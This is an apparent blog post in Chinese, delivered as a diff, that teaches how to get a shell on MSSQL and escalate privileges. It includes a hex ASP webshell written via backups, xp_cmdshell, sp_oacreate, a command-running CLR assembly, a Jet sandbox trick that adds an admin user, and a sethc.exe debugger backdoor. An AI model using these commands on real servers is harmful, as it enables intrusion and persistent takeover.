+insert into test(cmd) values(0x3C25657865637574652872657175657374282261222929253E)   （将webshell转成16进制）
+
+backup database 库名 to disk='C:\d.asp' WITH DIFFERENTIAL,FORMAT;--
+</code></pre>
+<h3 id="log备份拿shell">log备份拿shell</h3>
+<p>LOG备份的要求是他的数据库备份过，而且选择恢复模式得是完整模式，至少在2008上是这样的，但是使用log备份文件会小的多，当然如果你的权限够高可以设置他的恢复模式</p>
+<pre><code class="language-mssql">alter database 库名 set RECOVERY FULL 
+
+create table cmd (a image) 
+
+backup log 库名 to disk = 'c:\xxx' with init 
+
+insert into cmd (a) values (0x3C25657865637574652872657175657374282261222929253E) （将webshell转成16进制）
+
+backup log 库名 to disk = 'c:\xxx\2.asp'
+</code></pre>
+<p>log备份的好处就是备份出来的webshell的文件大小非常的小</p>
+<h2 id="提权">提权</h2>
+<h3 id="xpcmdshell提权">xpcmdshell提权</h3>
+<blockquote>
+<p>xp_cmdshell默认在mssql2000中是开启的，在mssql2005之后默认禁止，但未删除</p>
+</blockquote>
+<h4 id="0x01-xp_cmdshell简介">0x01 xp_cmdshell简介</h4>
+<p><code>xp``_cmdshell</code>是<code>Sql Server</code>中的一个组件，将命令字符串作为操作系统命令 shell 执行，并以文本行的形式返回所有输出。通常在拿到sa口令之后，可以通过<code>xp``_cmdshell</code>来进行提权</p>
+<p><strong>影响范围：</strong></p>
+<p>只要该数据库存在该组件，就可以利用</p>
+<h4 id="0x02-xp_cmdshell使用">0x02 xp_cmdshell使用</h4>
+<h5 id="1-查看xp_cmdshell状态">1. 查看xp_cmdshell状态</h5>
+<p>判断xpcmdshell权限</p>
+<pre><code>declare @RunningOnACluster char(1)
+declare @xp_cmdshell_available char(1)
+declare @result int 
+set @xp_cmdshell_available='Y' 
+set @result=0
+select @RunningOnACluster=case 
+when convert(int, serverproperty('IsClustered')) = 1 then 'Y'
+else 'N' 
+end 
+if(0=(select value_in_use from sys.configurations where name='xp_cmdshell'))
+    set @xp_cmdshell_available='N' if @RunningOnACluster='Y' 
+begin
+    if @xp_cmdshell_available='Y'
+        select @result=1
+    if @xp_cmdshell_available='N'
+        select @result=2
+end
+select @result
+</code></pre>
+<p><img src="images/image-20210721221255985.png" alt="image-20210721221255985"></p>
+<p>返回1表示<code>xp_cmdshell</code>组件启用，返回0则表示未启用。</p>
+<p><strong>恢复xp_cmdshell存储过程</strong></p>
+<pre><code>解决Error Message:未能找到存储过程 ‘master..xp_cmdshell’。
+
+第一步先删除：
+drop procedure sp_addextendedproc
+drop procedure sp_oacreate
+exec sp_dropextendedproc 'xp_cmdshell'
+
+第二步恢复：
+dbcc addextendedproc(&quot;sp_oacreate&quot;,&quot;odsole70.dll&quot;)
+dbcc addextendedproc(&quot;xp_cmdshell&quot;,&quot; &quot;)
+
+直接恢复，不管sp_addextendedproc是不是存在，需要自行上传xplog70.dll，恢复扩展存储过过程xp_cmdshell的语句:
+dbcc addextendedproc(&quot;xp_cmdshell&quot;,&quot;xplog70.dll&quot;)
+
+
+代码判断一系列存储过程是否存在，若不存在则恢复。
+if not exists (select * from dbo.sysobjects where id = object_id(N'[dbo].[xp_cmdshell]'))
+dbcc addextendedproc ('xp_cmdshell','xplog70.dll')
+if not exists (select * from dbo.sysobjects where id = object_id(N'[dbo].[xp_dirtree]'))
+dbcc addextendedproc ('xp_dirtree','xpstar.dll')
+if not exists (select * from dbo.sysobjects where id = object_id(N'[dbo].[xp_fixeddrives]'))
+dbcc addextendedproc ('xp_fixeddrives','xpstar.dll')
+if not exists (select * from dbo.sysobjects where id = object_id(N'[dbo].[xp_regwrite]'))
+dbcc addextendedproc ('xp_regwrite','xpstar.dll')
+if not exists (select * from dbo.sysobjects where id = object_id(N'[dbo].[xp_regread]'))
+dbcc addextendedproc ('xp_regread','xpstar.dll')
+</code></pre>
+<h5 id="2开启xp_cmdshell存储过程">2.开启xp_cmdshell存储过程</h5>
+<pre><code>EXEC sp_configure 'show advanced options', 1; RECONFIGURE; exec SP_CONFIGURE 'xp_cmdshell', 1; RECONFIGURE;
+</code></pre>
+<p><img src="images/image-20210721221511367.png" alt="image-20210721221511367"></p>
+<h5 id="3xp_cmdshell执行系统命令">3.xp_cmdshell执行系统命令</h5>
+<p><strong>xp_cmdshell执行whoami命令</strong></p>
+<pre><code>exec master.dbo.xp_cmdshell 'whoami'
+exec master.dbo.xp_cmdshell &quot;whoami&quot;
+exec xp_cmdshell &quot;whoami&quot;;
+</code></pre>
+<h5 id="4关闭xp_cmdshell存储过程">4.关闭xp_cmdshell存储过程</h5>
+<p>关闭xp_cmdshell配置</p>
+<pre><code>EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 0;RECONFIGURE;
+</code></pre>
+<p>删除xp_cmdshell的语句:</p>
+<pre><code>exec sp_dropextendedproc 'xp_cmdshell';
+</code></pre>
+<p>删除xp_cmdshell过程，再添加xp_cmdshell过程，需要自行上传xplog70.dll恢复被删除的xp_cmdshell。</p>
+<pre><code>drop procedure xp_cmdshell;
+exec sp_addextendedproc &quot;xp_cmdshell&quot;, &quot;xplog70.dll&quot;;
+</code></pre>
+<p>附录</p>
+<pre><code>exec sp_addextendedproc xp_cmdshell ,@dllname ='xplog70.dll'
+exec sp_addextendedproc xp_enumgroups ,@dllname ='xplog70.dll'
+exec sp_addextendedproc xp_loginconfig ,@dllname ='xplog70.dll'
+exec sp_addextendedproc xp_enumerrorlogs ,@dllname ='xpstar.dll'
+exec sp_addextendedproc xp_getfiledetails ,@dllname ='xpstar.dll'
+exec sp_addextendedproc Sp_OACreate ,@dllname ='odsole70.dll'
+exec sp_addextendedproc Sp_OADestroy ,@dllname ='odsole70.dll'
+exec sp_addextendedproc Sp_OAGetErrorInfo ,@dllname ='odsole70.dll'
+exec sp_addextendedproc Sp_OAGetProperty ,@dllname ='odsole70.dll'
+exec sp_addextendedproc Sp_OAMethod ,@dllname ='odsole70.dll'
+exec sp_addextendedproc Sp_OASetProperty ,@dllname ='odsole70.dll'
+exec sp_addextendedproc Sp_OAStop ,@dllname ='odsole70.dll'
+exec sp_addextendedproc xp_regaddmultistring ,@dllname ='xpstar.dll'
+exec sp_addextendedproc xp_regdeletekey ,@dllname ='xpstar.dll'
+exec sp_addextendedproc xp_regdeletevalue ,@dllname ='xpstar.dll'
+exec sp_addextendedproc xp_regenumvalues ,@dllname ='xpstar.dll'
+exec sp_addextendedproc xp_regremovemultistring ,@dllname ='xpstar.dll'
+exec sp_addextendedproc xp_regwrite ,@dllname ='xpstar.dll'
+exec sp_addextendedproc xp_dirtree ,@dllname ='xpstar.dll'
+exec sp_addextendedproc xp_regread ,@dllname ='xpstar.dll'
+exec sp_addextendedproc xp_fixeddrives ,@dllname ='xpstar.dll'
+</code></pre>
+<p>简单总结：</p>
+<pre><code>xp_cmdshell默认在mssql2000中是开启的，在mssql2005之后的版本中则默认禁止。如果用户拥有管理员sa权限则可以用sp_configure重新开启它。
+
+启用：
+EXEC sp_configure 'show advanced options', 1
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+
+关闭：
+exec sp_configure 'show advanced options', 1;
+reconfigure;
+exec sp_configure 'xp_cmdshell', 0;
+reconfigure;
+
+删除：
+exec sp_dropextendedproc 'xp_cmdshell';
+
+执行：
+EXEC master.dbo.xp_cmdshell '命令'
+
+如果xp_cmdshell被删除了，可以上传xplog70.dll进行恢复
+exec master.sys.sp_addextendedproc 'xp_cmdshell', 'C:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll'
+</code></pre>
+<h3 id="sp_oacreate">SP_OACREATE</h3>
+<h4 id="0x01-sp_oacreate简介">0x01 sp_oacreate简介</h4>
+<blockquote>
+<p>调用wscript.shel执行命令</p>
+</blockquote>
+<p><code>sp_oacreate</code>系统存储过程可以用于对文件删除、复制、移动等操作，还可以配合<code>sp_oamethod</code>系统存储过程调用系统<code>wscript.shell</code>来执行系统命令。<code>sp_oacreate</code>和<code>sp_oamethod</code>两个过程分别用来创建和执行脚本语言。</p>
+<p>系统管理员使用<code>sp_configure</code>启用<code>sp_oacreate</code>和<code>sp_oamethod</code>系统存储过程对OLE自动化过程的访问（OLE Automation Procedures）</p>
+<p>在效果方面，<code>sp_oacreate、sp_oamethod</code>两个过程和<code>xp_cmdshell</code>过程功能类似，因此可以替换使用！</p>
+<p><strong>利用条件：</strong></p>
+<blockquote>
+<p>1.已获取到sqlserver sysadmin权限用户的账号与密码且未降权（如2019版本sa用户权限为mssqlserver，已降权）</p>
+<p>2.sqlserver允许远程连接</p>
+<p>3.OLE Automation Procedures选项开启</p>
+</blockquote>
+<h4 id="0x02-sp_oacreate使用">0x02 sp_oacreate使用</h4>
+<h5 id="1查看sp_oacreate状态">1.查看SP_OACREATE状态</h5>
+<p>我们可以在master.dbo.sysobjects中查看SP_OACREATE状态</p>
+<pre><code>select * from master.dbo.sysobjects where xtype='x' and name='SP_OACREATE'
+</code></pre>
+<p><img src="images/image-20210721223502725.png" alt="image-20210721223502725"></p>
+<h5 id="2判断sp_oacreate是否存在">2.判断SP_OACREATE是否存在</h5>
+<pre><code>select count(*) from master.dbo.sysobjects where xtype='x' and name='SP_OACREATE'
+</code></pre>
+<p><img src="images/image-20210721223634870.png" alt="image-20210721223634870"></p>
+<p>利用count(*)判断是否存在，存在即返回1。</p>
+<h5 id="3启用sp_oacreate">3.启用SP_OACREATE</h5>
+<p>利用sp_configure存储过程，启用SP_OACREATE</p>
+<pre><code>exec sp_configure 'show advanced options', 1; RECONFIGURE WITH OVERRIDE;   
+exec sp_configure 'Ole Automation Procedures', 1; RECONFIGURE WITH OVERRIDE;
+</code></pre>
+<p><img src="images/image-20210721223724464.png" alt="image-20210721223724464"></p>
+<h5 id="4利用sp_oacreate执行命令">4.利用SP_OACREATE执行命令</h5>
+<p>利用SP_OACREATE执行系统命令</p>
+<pre><code>declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'C:\Windows\System32\cmd.exe /c whoami /all &gt;C:\\test\test.txt'
+</code></pre>
+<p><img src="images/image-20210721223922956.png" alt="image-20210721223922956"></p>
+<p>此利用方法无回显</p>
+<h5 id="5关闭组件命令">5.关闭组件命令</h5>
+<pre><code>exec sp_configure 'show advanced options',1;
+reconfigure;
+exec sp_configure 'Ole Automation Procedures',0;
+reconfigure;
+</code></pre>
+<p>简单总结</p>
+<pre><code>判断SP_OACREATE是否存在
+select count(*) from master.dbo.sysobjects where xtype='x' and name='SP_OACREATE'
+
+启用：
+EXEC sp_configure 'show advanced options', 1;   
+RECONFIGURE WITH OVERRIDE;   
+EXEC sp_configure 'Ole Automation Procedures', 1;   
+RECONFIGURE WITH OVERRIDE;   
+
+关闭：
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE WITH OVERRIDE;   
+EXEC sp_configure 'Ole Automation Procedures', 0;   
+RECONFIGURE WITH OVERRIDE;  
+
+执行：
+declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'C:\Windows\System32\cmd.exe /c whoami /all &gt;C:\\test\test.txt'
+
+以上是使用sp_oacreate的提权语句，主要是用来调用OLE对象（Object Linking and Embedding的缩写，VB中的OLE对象），利用OLE对象的run方法执行系统命令。
+</code></pre>
+<h3 id="clr提权">CLR提权</h3>
+<h4 id="0x01-clr简介">0x01 CLR简介</h4>
+<p>CLR微软官方把他称为公共语言运行时，从 SQL Server 2005 (9.x) 开始，SQL Server 集成了用于 Microsoft Windows 的 .NET Framework 的公共语言运行时 (CLR) 组件。 这意味着现在可以使用任何 .NET Framework 语言（包括 Microsoft Visual Basic .NET 和 Microsoft Visual C#）来编写存储过程、触发器、用户定义类型、用户定义函数、用户定义聚合和流式表值函数。</p>
+<p>更多概念详见下方官方链接：</p>
+<p><a href="https://docs.microsoft.com/zh-cn/sql/relational-databases/clr-integration/common-language-runtime-clr-integration-programming-concepts?view=sql-server-ver15">https://docs.microsoft.com/zh-cn/sql/relational-databases/clr-integration/common-language-runtime-clr-integration-programming-concepts?view=sql-server-ver15</a></p>
+<h4 id="0x02-编写clr">0x02 编写CLR</h4>
+<p>利用VS创建MSSQL数据库项目</p>
+<p><img src="./images//image-20210708163521982.png" alt="image-20210708163521982"></p>
+<p>修改目标平台和勾选创建脚本</p>
+<p><img src="./images//image-20210710105308908.png" alt="image-20210710105308908"></p>
+<p>在SQL Server 2005中引入了从MSSQL运行.NET代码的功能，并在后续版本中叠加了许多保护措施，来限制代码可以访问的内容。在创建.Net程序集时，会给它们指定一个权限级别，例如：</p>
+<pre><code>CREATE ASSEMBLY SQLCLRTest  
+FROM 'C:\MyDBApp\SQLCLRTest.dll'  
+WITH PERMISSION_SET = SAFE;
+</code></pre>
+<p>其权限集有三个选项：</p>
+<p>SAFE：基本上只将MSSQL数据集暴露给代码，其他大部分操作则都被禁止。</p>
+<p>EXTERNAL_ACCESS：允许访问底层服务器上某些资源，但不应该允许直接执行代码。</p>
+<p>UNSAFE：允许使用任何代码。</p>
+<p>微软关于SQL CLR的详细文档可通过以下地址获得： <a href="https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration">https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration</a></p>
+<p>根据不同的数据库选择不同的.net，修改目标框架和权限级别为UNSAFE。</p>
+<p><img src="./images//image-20210710105538418.png" alt="image-20210710105538418"></p>
+<p>创建SQL CLR C# 存储过程</p>
+<p><img src="./images//image-20210708163707308.png" alt="image-20210708163707308"></p>
+<p><img src="./images//image-20210708163728579.png" alt="image-20210708163728579"></p>
+<p>写入代码</p>
+<pre><code>using System;
+using System.Data;
+using System.Data.SqlClient;
+using System.Data.SqlTypes;
+using System.Diagnostics;
+using System.Text;
+using Microsoft.SqlServer.Server;
+
+public partial class StoredProcedures
+{
+    [Microsoft.SqlServer.Server.SqlProcedure]
+    public static void ExecCommand (string cmd)
+    {
+        // 在此处放置代码
+        SqlContext.Pipe.Send(&quot;Command is running, please wait.&quot;);
+        SqlContext.Pipe.Send(RunCommand(&quot;cmd.exe&quot;, &quot; /c &quot; + cmd));
+    }
+    public static string RunCommand(string filename,string arguments)
+    {
+        var process = new Process();
+
+        process.StartInfo.FileName = filename;
+        if (!string.IsNullOrEmpty(arguments))
+        {
+            process.StartInfo.Arguments = arguments;
+        }
+
+        process.StartInfo.CreateNoWindow = true;
+        process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+        process.StartInfo.UseShellExecute = false;
+
+        process.StartInfo.RedirectStandardError = true;
+        process.StartInfo.RedirectStandardOutput = true;
+        var stdOutput = new StringBuilder();
+        process.OutputDataReceived += (sender, args) =&gt; stdOutput.AppendLine(args.Data);
+        string stdError = null;
+        try
+        {
+            process.Start();
+            process.BeginOutputReadLine();
+            stdError = process.StandardError.ReadToEnd();
+            process.WaitForExit();
+        }
+        catch (Exception e)
+        {
+            SqlContext.Pipe.Send(e.Message);
+        }
+
+        if (process.ExitCode == 0)
+        {
+            SqlContext.Pipe.Send(stdOutput.ToString());
+        }
+        else
+        {
+            var message = new StringBuilder();
+
+            if (!string.IsNullOrEmpty(stdError))
+            {
+                message.AppendLine(stdError);
+            }
+
+            if (stdOutput.Length != 0)
+            {
+                message.AppendLine(&quot;Std output:&quot;);
+                message.AppendLine(stdOutput.ToString());
+            }
+            SqlContext.Pipe.Send(filename + arguments + &quot; finished with exit code = &quot; + process.ExitCode + &quot;: &quot; + message);
+        }
+        return stdOutput.ToString();
+    }
+}
+</code></pre>
+<p>编译成功后</p>
+<p><img src="./images//image-20210710105507114.png" alt="image-20210710105507114"></p>
+<p>将以下文件保存为dll.ps1(需要修改dll路径)</p>
+<pre><code>$assemblyFile = &quot;C:\Users\Administrator\Desktop\dll\sysinfo.dll&quot;
+
+$stringBuilder = New-Object -Type System.Text.StringBuilder
+
+$stringBuilder.AppendLine(&quot;use msdb;&quot;) | Out-Null
+
+$stringBuilder.AppendLine(&quot;alter database master set trustworthy on;&quot;) | Out-Null
+
+$stringBuilder.AppendLine(&quot;exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'clr enabled',1;reconfigure;&quot;) | Out-Null
+
+$stringBuilder.Append(&quot;CREATE ASSEMBLY [sysinfo] AUTHORIZATION [dbo] FROM `n0x&quot;) | Out-Null
+
+$fileStream = [IO.File]::OpenRead($assemblyFile) 
+while (($byte = $fileStream.ReadByte()) -gt -1) { $stringBuilder.Append($byte.ToString(&quot;X2&quot;)) | Out-Null }
+
+$stringBuilder.AppendLine(&quot;`n WITH PERMISSION_SET = UNSAFE;&quot;) | Out-Null
+$stringBuilder.AppendLine(&quot; &quot;) | Out-Null
+
+$stringBuilder.AppendLine(&quot;CREATE PROCEDURE [dbo].[ExecCommand] @cmd NVARCHAR (MAX) AS EXTERNAL NAME [sysinfo].[StoredProcedures].[ExecCommand]&quot;) | Out-Null
+$stringBuilder.AppendLine(&quot; &quot;) | Out-Null
+
+$stringBuilder.AppendLine(&quot;exec dbo.ExecCommand 'whoami /all';&quot;) | Out-Null 
+$stringBuilder.AppendLine(&quot; &quot;) | Out-Null
+
+$stringBuilder.ToString() -join &quot;&quot; | Out-File C:\Users\Administrator\Desktop\dll\exec.txt
+</code></pre>
+<p>输入以下命令，生成提权用到的命令，运行完成后在当前目录生成exec.txt文件（该脚本用于生成提权语句，将dll转成16进制，通过这种方式文件不落地。）</p>
+<pre><code>pwershell -exec bypass ./dll.ps1
+</code></pre>
+<p><img src="images/image-20210709114937318.png" alt="image-20210709114937318"></p>
+<p>打开可看到提权SQL语句，分别运行每一条SQL语句</p>
+<p><img src="images/image-20210709115001864.png" alt="image-20210709115001864"></p>
+<p>进入msdb数据库</p>
+<pre><code>use msdb;
+</code></pre>
+<p><img src="images/image-20210709115127461.png" alt="image-20210709115127461"></p>
+<h4 id="0x03-将存储net程序集的数据库配置为可信赖的">0x03 将存储.Net程序集的数据库配置为可信赖的。</h4>
+<pre><code>alter database master set trustworthy on;
+</code></pre>
+<p><img src="images/image-20210709115140291.png" alt="image-20210709115140291"></p>
+<h4 id="0x04-启用mssql-clr功能">0x04 启用MSSQL CLR功能</h4>
+<pre><code>exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'clr enabled',1;reconfigure;
+
+
+
+命令解释：
+exec sp_configure 'show advanced options',1;     #显示高级选项：
+reconfigure;                                     #重新配置
+exec sp_configure 'clr enabled',1;               # 开启clr enabled 选项
+reconfigure;                                     #重新配置
+
+--关闭所有服务器配置选项
+EXEC sp_configure N'show advanced options', N'0' 
+RECONFIGURE WITH OVERRIDE
+
+--如果存在权限问题，执行下面一段脚本
+alter database [master] set TRUSTWORTHY on
+EXEC sp_changedbowner 'sa'
+</code></pre>
+<p><img src="images/image-20210709115156855.png" alt="image-20210709115156855"></p>
+<h4 id="0x05-利用sql语句导入程序集">0x05 利用SQL语句导入程序集</h4>
+<pre><code>CREATE ASSEMBLY [Database1]
+    AUTHORIZATION [dbo]
+    FROM 0x0000
+    WITH PERMISSION_SET = UNSAFE;
+GO
+</code></pre>
+<h4 id="0x06-创建存储过程">0x06 创建存储过程</h4>
+<pre><code>CREATE PROCEDURE [dbo].[ExecCommand] @cmd NVARCHAR (MAX) AS EXTERNAL NAME [sysinfo].[StoredProcedures].[ExecCommand]
+</code></pre>
+<h4 id="0x07-执行命令">0x07 执行命令</h4>
+<p>执行系统命令，查看当前的权限</p>
+<pre><code>exec dbo.ExecCommand 'whoami';
+</code></pre>
+<p><img src="images/image-20210709115639568.png" alt="image-20210709115639568"></p>
+<h3 id="沙盒提权">沙盒提权</h3>
+<p><strong>什么是沙盒？</strong></p>
+<p>沙盒（英语：sandbox，又译为沙箱），计算机专业术语，在计算机安全领域中是一种安全机制，为运行中的程序提供的隔离环境。通常是作为一些来源不可信、具破坏力或无法判定程序意图的程序提供实验之用。</p>
+<p><strong>利用前提：</strong></p>
+<blockquote>
+<p>1.需要<code>Microsoft.Jet.OLEDB.4.0</code>一般在32位系统才可以，64位机需要12.0，较复杂</p>
+<p><code>2.dnary.mdb</code>和<code>ias.mdb</code>两个文件 在<code>win2003</code>上默认存在，也可自行准备</p>
+</blockquote>
+<p><strong>提权操作</strong></p>
+<p>简单总结</p>
+<pre><code>--提权语句
+
+exec sp_configure 'show advanced options',1;reconfigure;
+
+-- 不开启的话在执行xp_regwrite会提示让我们开启，
+
+exec sp_configure 'Ad Hoc Distributed Queries',1;reconfigure;
+
+--关闭沙盒模式，如果一次执行全部代码有问题，先执行上面两句代码。
+
+exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',0;
+
+--查询是否正常关闭，经过测试发现沙盒模式无论是开，还是关，都不会影响我们执行下面的语句。
+
+exec master.dbo.xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines', 'SandBoxMode'
+
+--执行系统命令select * from openrowset('microsoft.jet.oledb.4.0',';database=c:/windows/system32/ias/ias.mdb','select shell(&quot;net user margin margin /add&quot;)')
+
+select * from openrowset('microsoft.jet.oledb.4.0',';database=c:/windows/system32/ias/ias.mdb','select shell(&quot;net localgroup administrators margin /add&quot;)')
+
+沙盒模式SandBoxMode参数含义（默认是2）
+
+`0`：在任何所有者中禁止启用安全模式
+
+`1` ：为仅在允许范围内
+
+`2` ：必须在access模式下
+
+`3`：完全开启
+
+openrowset是可以通过OLE DB访问SQL Server数据库，OLE DB是应用程序链接到SQL Server的的驱动程序。
+
+--恢复配置
+
+--exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1;
+
+--exec sp_configure 'Ad Hoc Distributed Queries',0;reconfigure;
+
+--exec sp_configure 'show advanced options',0;reconfigure;
+</code></pre>
+<p>引用前辈们的话</p>
+<blockquote>
+<p>1，Access可以调用VBS的函数，以System权限执行任意命令 2，Access执行这个命令是有条件的，需要一个开关被打开 3，这个开关在注册表里 4，SA是有权限写注册表的 5，用SA写注册表的权限打开那个开关 6，调用Access里的执行命令方法，以system权限执行任意命令执行SQL命令，执行了以下命令</p>
+</blockquote>
+<h3 id="利用镜像劫持提权">利用镜像劫持提权</h3>
+<h4 id="0x01-简介">0x01 简介</h4>
+<p>通过使用<code>xp_regwrite</code>存储过程对注册表进行修改，替换成任意值，造成镜像劫持。</p>
+<p>前提条件：</p>
+<blockquote>
+<p>1.未禁止注册表编辑（即写入功能）</p>
+<p>2.xp_regwrite启用</p>
+</blockquote>
+<h4 id="0x02-映像劫持提权">0x02 映像劫持提权</h4>
+<h5 id="1查看xp_regwrite是否启用">1.查看xp_regwrite是否启用</h5>
+<pre><code>select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_regwrite'
+</code></pre>
+<p><img src="images/image-20210722165615030.png" alt="image-20210722165615030"></p>
+<p>返回1表示<code>xp_regwrite</code>组件启用  返回0则表示未启用</p>
+<h5 id="2xp_regwrite开启与关闭">2.xp_regwrite开启与关闭</h5>
+<pre><code>EXEC sp_configure 'show advanced options', 1
+RECONFIGURE
+EXEC sp_configure 'xp_regwrite',1
+RECONFIGURE
+</code></pre>
+<h5 id="3利用regwrite函数修改组注册表进行劫持">3.利用regwrite函数修改组注册表进行劫持</h5>
+<p>首先我们利用<code>regwrite</code>函数修改组册表进行劫持，这里如果<code>regwrite</code>执行失败参考上面的开启方法。</p>
+<pre><code class="language-mssql">EXEC master..xp_regwrite @rootkey='HKEY_LOCAL_MACHINE',@key='SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.EXE',@value_name='Debugger',@type='REG_SZ',@value='c:\windows\system32\cmd.exe'
+</code></pre>
+<p><img src="images/image-20210722170031426.png" alt="image-20210722170031426"></p>
+<h5 id="4查看是否劫持成功">4.查看是否劫持成功</h5>
+<pre><code class="language-mssql">exec master..xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe','Debugger'
+</code></pre>
+<p><img src="images/image-20210722170108578.png" alt="image-20210722170108578"></p>
+<h5 id="5验证是否成功">5.验证是否成功</h5>
+<p>紧接着我们远程连接桌面，然后连续按5次<code>shift</code>就可以调用<code>cmd</code>窗口</p>
+<p><img src="images/image-20210722153101842.png" alt="image-20210722153101842"></p>
+<p><strong>拓展：</strong></p>
+<p>上面对只是对粘滞键进行修改，类似的，可以在注册表中进行其他操作</p>
+<h5 id="6删除指定注册表键值">6.删除指定注册表键值</h5>
+<p>删除粘滞键的键值</p>
+<pre><code>xp_regdeletekey 'HKEY_LOCAL_MACHINE', 'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe'
+</code></pre>
+<h3 id="利用agent-job执行命令">利用Agent Job执行命令</h3>
+<h4 id="0x01-简介-1">0x01 简介</h4>
+<p>SQL Server代理是一项Microsoft Windows服务，它执行计划的管理任务，这些任务在SQL Server 2019（15.x）中称为作业。</p>
+<p>原理：创建一个任务并执行命令，命令执行后的结果，将结果写入文件中。</p>
+<h4 id="job执行命令">Job执行命令</h4>
+<h5 id="1启动sqlagent服务">1.启动sqlagent服务</h5>
+<p>首先需要启动sqlagent服务：</p>
+<pre><code class="language-mssql">exec master.dbo.xp_servicecontrol 'start','SQLSERVERAGENT'
+</code></pre>
+<p><img src="images/image-20210723170216945.png" alt="image-20210723170216945"></p>
+<h5 id="2进入数据库">2.进入数据库</h5>
+<pre><code>USE msdb; 
+</code></pre>
+<p><img src="images/image-20210723170748492.png" alt="image-20210723170748492"></p>
+<h5 id="3定义创建作业">3.定义创建作业</h5>
+<pre><code>EXEC dbo.sp_add_job @job_name = N'test_powershell_job1'; 
+</code></pre>
+<p><img src="images/image-20210723170802911.png" alt="image-20210723170802911"></p>
+<h5 id="4定义作业步骤">4.定义作业步骤</h5>
+<p>定义作业步骤(作业中查看当前用户并将用户写入c:\1.txt文件中)</p>
+<pre><code>EXEC sp_add_jobstep @job_name = N'test_powershell_job1', @step_name = N'test_powershell_name1', @subsystem = N'PowerShell', @command = N'c:\windows\system32\cmd.exe /c whoami &gt;c:\\1.txt', @retry_attempts = 1, @retry_interval = 5 ;EXEC dbo.sp_add_jobserver @job_name = N'test_powershell_job1'; 
+</code></pre>
+<p><img src="images/image-20210723171222504.png" alt="image-20210723171222504"></p>
+<h5 id="5启动作业">5.启动作业</h5>
+<p>启动作业（启动作业需要一点时间，作业完成后会在c盘目录下新建），如果命令没有执行成功多运行几次即可。</p>
+<pre><code>EXEC dbo.sp_start_job N'test_powershell_job1';
+</code></pre>
+<p><img src="images/image-20210723171806579.png" alt="image-20210723171806579"></p>
+<h5 id="6验证是否成功">6.验证是否成功</h5>
+<p><img src="images/image-20210723180329095.png" alt="image-20210723180329095"></p>
+<p>参考地址：</p>
+<pre><code>https://www.freebuf.com/vuls/276814.html
+https://y4er.com/post/mssql-getshell/
+https://f5.pm/go-26046.html
+http://alexsel.com/index.php/archives/80/
+https://xz.aliyun.com/t/9475
+</code></pre>
+
+    </div>
+    <div class="article-footer">
+<blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接: </strong>
+      <a href="https://ad-calcium.github.io/2021/07/mssql%E6%8F%90%E6%9D%83/" title="MSSQL获取shell和提权" target="_blank" rel="external">https://ad-calcium.github.io/2021/07/mssql%E6%8F%90%E6%9D%83/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>License: </strong>
+        <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN</a>
+    </li>
+  </ul>
+</blockquote>
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/ad-calcium" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="https://ad-calcium.github.io/avatar.png" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/ad-calcium" target="_blank"><span class="text-dark">AD钙奶</span><small class="ml-1x"></small></a></h3>
+        <div>Good Good Study, Day Day Up~</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+    </div>
+  </article>
+</div><nav class="bar bar-footer clearfix" data-stick-bottom>
+    <div class="bar-inner">
+        <ul class="pager pull-left">
+            <li class="prev">
+                <a href="https://ad-calcium.github.io/2021/07/jd%E7%BE%8A%E6%AF%9B%E8%84%9A%E6%9C%AC%E6%BC%8F%E6%B4%9E/" title="JD羊毛脚本漏洞"><i
+                        class="icon icon-angle-left"
+                        aria-hidden="true"></i><span>&nbsp;&nbsp;下一篇</span></a>
+            </li>
+            <li class="next">
+                <a href="https://ad-calcium.github.io/2021/07/%E6%B5%81%E9%87%8F%E4%BB%A3%E7%90%86/"
+                    title="内网穿透工具的使用"><span>上一篇&nbsp;&nbsp;</span><i
+                        class="icon icon-angle-right" aria-hidden="true"></i></a>
+            </li>
+            
+            <li class="toggle-toc">
+                <a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false"
+                    title="文章目录" role="button">
+                    <span>[&nbsp;</span><span>文章目录</span>
+                    <i class="text-collapsed icon icon-anchor"></i>
+                    <i class="text-in icon icon-close"></i>
+                    <span>]</span>
+                </a>
+            </li>
+        </ul>
+        <div class="bar-right">
+            <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter"
+                data-mobile-sites="weibo,qq,qzone"></div>
+        </div>
+    </div>
+</nav>
+
+
+</main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+  <div class="copyright">
+    &copy;2020  -
